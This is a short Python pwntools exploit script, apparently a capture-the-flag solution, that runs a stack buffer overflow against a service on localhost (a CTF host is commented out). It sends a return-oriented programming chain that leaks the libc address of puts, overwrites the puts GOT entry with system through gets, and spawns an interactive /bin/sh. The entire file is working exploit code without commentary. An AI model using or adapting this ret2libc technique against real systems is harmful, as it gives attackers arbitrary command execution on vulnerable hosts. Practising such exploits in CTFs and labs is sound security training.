from pwn import *
context.arch = 'amd64'

offset = 40
pop_rdi = 0x00000000004006f3
put_got = 0x0000000000601018
put_plt = 0x4004e0
gets_plt = 0x400510
put_libc = 0x000000000006f690
system_libc = 0x0000000000045390

rop = flat([pop_rdi, put_got, put_plt, pop_rdi, put_got, gets_plt, pop_rdi, put_got+8, put_got])

# r = remote('csie.ctf.tw', 10131)
r = remote('localhost', 8888)

print(r.recv())
r.sendline('a' * offset + rop)
r.recvuntil('\n')
put_addr = u64(r.recvuntil('\n').strip().ljust(8, "\x00"))
print(hex(put_addr))
shift = put_addr - put_libc
system = shift + system_libc
r.sendline(p64(system) + "/bin/sh\x00")
r.interactive()
